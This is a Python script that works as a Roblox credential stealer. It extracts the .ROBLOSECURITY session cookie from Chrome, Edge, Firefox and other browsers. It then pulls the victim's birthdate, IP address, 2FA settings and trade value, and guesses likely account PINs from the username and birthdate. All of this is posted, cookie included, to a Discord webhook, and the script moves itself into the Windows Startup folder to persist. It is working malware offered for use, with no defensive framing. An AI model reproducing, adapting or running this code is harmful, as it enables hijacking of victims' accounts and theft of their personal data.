import browser_cookie3,json,requests,os,shutil,sys

##replace disshit
webhook_url = "YA HOOK HERE"
##roblox cookie extraction proccess usign modile uh the fucking broswercookie
def get_roblox_cookie():
    cookies = {}
    browsers = [('Chrome', browser_cookie3.chrome), ('Edge', browser_cookie3.edge), ('Firefox', browser_cookie3.firefox), ('Safari', browser_cookie3.safari), ('Opera', browser_cookie3.opera), ('Brave', browser_cookie3.brave), ('Vivaldi', browser_cookie3.vivaldi)]
    for browser_name, browser in browsers:
        try:
            browser_cookies = browser(domain_name='roblox.com')
            for cookie in browser_cookies:
                if cookie.name == '.ROBLOSECURITY':
                    cookies[browser_name] = cookie.value
        except:
            pass
    return cookies

#gets userinfo
def get_user_info(cookie):
    url = 'https://www.roblox.com/mobileapi/userinfo'
    headers = {
        'User-Agent': 'Roblox/WinInet',
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    response = requests.get(url, headers=headers)
    return response.json()
##SETTIGNSBOUTUSER

def pininfo(cookie):
    url = 'https://users.roblox.com/v1/birthdate'                                                                                                                                                                                                                                                                                                                                                    #Made by synaptrix lol
    headers = {
        'User-Agent': 'Roblox/WinInet',
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    response = requests.get(url, headers=headers)
    return response.json()



def coolinfo(cookie):
    url = 'https://www.roblox.com/my/settings/json'
    headers = {
        'User-Agent': 'Roblox/WinInet',
        'Cookie': f'.ROBLOSECURITY={cookie}'
    }
    response = requests.get(url, headers=headers)
    return response.json()

cookies = get_roblox_cookie()
if cookies:
    for browser_name, cookie_value in cookies.items():
        user_info = get_user_info(cookie_value)
        cool_info = coolinfo(cookie_value)
        pin_info = pininfo(cookie_value)
#CLASSICINFO
        username = user_info.get('UserName', 'Unknown')
        is_premium = user_info.get('IsPremium', False)
        user_id = user_info.get('UserID', 'Unknown')
        robux_balance = user_info.get('RobuxBalance', 0)
        thumbnail_url = user_info.get('ThumbnailUrl', '')
##CLASSICINFO

##PIN
        username = user_info.get('UserName', 'Unknown')
        year = pin_info.get('birthYear', 'Unknown')
        month = str(pin_info.get('birthMonth', '00')).zfill(2)
        day = str(pin_info.get('birthDay', '00')).zfill(2)

        likely = [username[:4], username[-4:], year, day+day, month+month, month+day, day+month]
        likely = [str(x) for x in likely if str(x).isdigit() and len(str(x)) == 4] ##Saw pincracker and how they got the likely pins creds to guy on disco that provided
##PIN

##MOREINFO
        cookie = cookie_value
        twostep = cool_info.get('IsTwoStepToggleEnabled', False)
        account_age_in_days = cool_info.get('AccountAgeInDays', 0)
        client_ip_address = cool_info.get('ClientIpAddress', '')
        is_email_verified = cool_info.get('IsEmailVerified', False)
        is_phone_feature_enabled = cool_info.get('IsPhoneFeatureEnabled', False)
        is_set_password_notification_enabled = cool_info.get('IsSetPasswordNotificationEnabled', False)
        change_password_requires_two_step_verification = cool_info.get('ChangePasswordRequiresTwoStepVerification', False)
        change_email_requires_two_step_verification = cool_info.get('ChangeEmailRequiresTwoStepVerification', False)
        is_account_pin_enabled = cool_info.get('IsAccountPinEnabled', False)
##MOREINFO

        player_api_url = f"https://www.rolimons.com/playerapi/player/{user_id}"
        response = requests.get(player_api_url)
        player_data = response.json()
        rap = player_data.get('value', 'N/A')


        payload = {
            'username': 'CookieBypasser',
            'embeds': [
                {
                    'title': f'New .ROBLOSECURITY cookie found in {browser_name} browser',
                    'description': (
    f'[Rolimons](https://www.rolimons.com/player/{user_id}) | [Roblox](https://www.roblox.com/users/{user_id}/profile)\n'
    f'👤 **Username:** {username}\n'
    f'🛡️ **Is Premium:** {":white_check_mark:" if is_premium else ":x:"}\n'
    f'🔢 **ID:** {user_id}\n'
    f'💰 **Robux Balance:** {robux_balance}\n'
     f'📈 **(RAP) Recent Average Price:** {rap}\n'
    f'🍪 **Cookie:** ```{cookie}```\n'
    f'📅 **Account Age:** {account_age_in_days} days\n'
    f'🌐 **IP Address:** {client_ip_address}\n'
    f'✉️ **Email Verified:** {":white_check_mark:" if is_email_verified else ":x:"}\n'
    f'📞 **Phone Enabled:** {":white_check_mark:" if is_phone_feature_enabled else ":x:"}\n'
    f'🔒 **Password Notification:** {":white_check_mark:" if is_set_password_notification_enabled else ":x:"}\n'
    f'🔐 **Change Password 2FA:** {":white_check_mark:" if change_password_requires_two_step_verification else ":x:"}\n'
    f'📧 **Change Email 2FA:** {":white_check_mark:" if change_email_requires_two_step_verification else ":x:"}\n'
    f'🔐 **2FA Enabled:** {":white_check_mark:" if twostep else ":x:"}\n'
    f'🔑 **Account PIN:** {":white_check_mark:" if is_account_pin_enabled else ":x:"}\n'
    f'💡 **Likely Pins:** {likely}\n'
    'Other Likely Pins are: 1234/4321/9999/6666/6969/9696'
                    ),
                    'color': 0x9b59b6,
                    'thumbnail': {
                        'url': thumbnail_url
                    }
                }
            ]
        }
        headers = {
            'Content-Type': 'application/json'
        }
        response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

cdtostartup = os.path.abspath(sys.argv[0])
getuser = os.environ.get("USERNAME")
startup = fr'C:\Users\{getuser}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
shutil.move(cdtostartup, os.path.join(startup, os.path.basename(cdtostartup)))

